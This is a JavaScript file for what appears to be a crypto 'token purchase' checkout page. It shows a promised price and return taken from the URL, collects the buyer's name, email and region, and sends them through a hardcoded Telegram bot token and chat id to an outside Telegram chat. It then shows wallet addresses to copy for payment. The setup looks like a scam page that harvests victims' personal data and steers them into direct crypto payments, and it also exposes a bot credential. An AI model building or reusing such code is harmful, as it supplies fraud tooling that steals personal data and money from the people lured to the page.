

// EXTRACTING THE PARAMETERS FROM THE URL
const url = new URL(window.location.href)
const price = url.searchParams.get('price')
const returnDet = url.searchParams.get('return')


// UPDATE THE NOTE DETAILS
const updateDetails = () => {
    let comingPrice = document.querySelector('.comingPrice')
    let comingReturn = document.querySelector('.comingReturn')

    comingPrice.textContent = price
    comingReturn.textContent = returnDet.toString()
}
updateDetails()


let regi = document.getElementById('region')



// GETTING THE CUSTOMER'S DETAILS
let first = document.getElementById('firstname')
let last = document.getElementById('lastname')
let emai = document.getElementById('email')
let payNowBtn = document.getElementById('payNowBtn')
let paymentWallets = document.querySelector('.paymentWallets')

// THE PAY NOW FUNCTIONALITY AND SECURITY CHECK
payNowBtn.addEventListener('click', () => {
    let firstname = document.getElementById('firstname').value
    let lastname = document.getElementById('lastname').value
    let email = document.getElementById('email').value
    let region = document.getElementById('region').value
    
    if(firstname == ''){
        first.style.border = '2px solid red'
        return
    }else{
        
        first.style.border = '2px solid goldenrod'
    }

    if(lastname == ''){
        last.style.border = '2px solid red'
        return
    }else{
        
        last.style.border = '2px solid goldenrod'
    }
    if(email == ''){
        emai.style.border = '2px solid red'
        return
    }else{
        
        emai.style.border = '2px solid goldenrod'
    }
    if(region == 'Country/Region'){
        regi.style.border = '2px solid red'
        return
    }else{
        
        regi.style.border = '2px solid goldenrod'
    }
    sendToTelegram(firstname, lastname, email, region)

    paymentWallets.style.display = 'flex'
})


// THE WALLET COPY FUNCTIONALITY
let firstWallet = document.querySelector('.firstWallet')
let secondWallet = document.querySelector('.secondWallet')
let thirdWallet = document.querySelector('.thirdWallet')
let fourthWallet = document.querySelector('.fourthWallet')
let cancelHead = document.querySelector('.cancelHead')
let copied = document.querySelector('.copied')

let firstWalletCopy = document.querySelector('.firstWalletCopy')
let secondWalletCopy = document.querySelector('.secondWalletCopy')
let thirdWalletCopy = document.querySelector('.thirdWalletCopy')
let fourthWalletCopy = document.querySelector('.fourthWalletCopy')

firstWalletCopy.addEventListener('click', () => {
    console.log('clicked');
    
    navigator.clipboard.writeText(firstWallet.textContent)
    copied.style.display = 'flex'
    setTimeout(() => {
        copied.style.display = 'none'
    }, 1500);
})

secondWalletCopy.addEventListener('click', () => {
    navigator.clipboard.writeText(secondWallet.textContent)
    copied.style.display = 'flex'
    setTimeout(() => {
        copied.style.display = 'none'
    }, 1500);
})

thirdWalletCopy.addEventListener('click', () => {
    navigator.clipboard.writeText(thirdWallet.textContent)
    copied.style.display = 'flex'
    setTimeout(() => {
        copied.style.display = 'none'
    }, 1500);
})

fourthWalletCopy.addEventListener('click', () => {
    navigator.clipboard.writeText(fourthWallet.textContent)
    copied.style.display = 'flex'
    setTimeout(() => {
        copied.style.display = 'none'
    }, 1500);
})


// THE CANCEL BUTTON FUNCTIONALITY
cancelHead.addEventListener('click', () => {
    paymentWallets.style.display = 'none'
})

// SENDING DETIALS TO TELEGRAM
function sendToTelegram(firstname, lastname, email, region){
        const API_KEY = '7048538136:AAGlNzqAf5uO-z1rvGmS2FUxMRowDiY27SI'
        const chat_id = 6399168843

        const message = `
          Purchase Token Message:
          Firstname: ${firstname}
          Lastname: ${lastname}
          Email: ${email}
          Region: ${region}
         `
      ;

fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        chat_id: `${chat_id}`,
        text: message,
    }),
})
.then(response => response.json())
.then(data =>  {
//   console.log('Message sent:', data)
//   if(data.ok){
//     alert(`Order of ${productName} placed`)
//   }
})
.catch(error => console.error('Error sending message:', error));
}

// THE GET STARTED BUTTON FUNCTIONALITY
// let getStartedDiv = document.querySelector('.getStarted')
// getStartedDiv.addEventListener('click', () => {
//     window.location.href = 'index.html'
// })



